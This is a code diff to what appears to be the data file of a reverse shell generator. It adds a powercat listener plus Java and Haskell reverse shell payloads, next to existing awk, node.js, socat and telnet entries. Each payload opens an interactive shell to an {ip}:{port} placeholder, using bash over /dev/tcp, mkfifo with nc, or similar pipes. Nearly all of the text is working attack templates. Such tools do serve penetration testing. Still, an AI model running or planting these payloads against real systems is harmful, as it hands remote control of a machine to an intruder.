@@ -6,7 +6,8 @@ const rsgData = {
         ['pwncat', 'python3 -m pwncat -lp {port}'],
         ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
         ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
-        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}']
+        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
+        ['powercat', 'powercat -l -p {port}']
     ],
 
     shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
@@ -48,6 +49,8 @@ const rsgData = {
         ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'{shell}\',pty,stderr,setsid,sigint,sane'],
         ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
         ['node.js', 'require(\'child_process\').exec(\'nc -e {shell} {ip} {port}\')'],
+        ['Java #1','import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class shell {\n    public static void main(String args[]) {\n        String s;\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}'],
+        ['Haskell #1','module Main where\n\nimport System.Process\n\nmain = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f"'],
         ['telnet', 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF'],
     ],
 
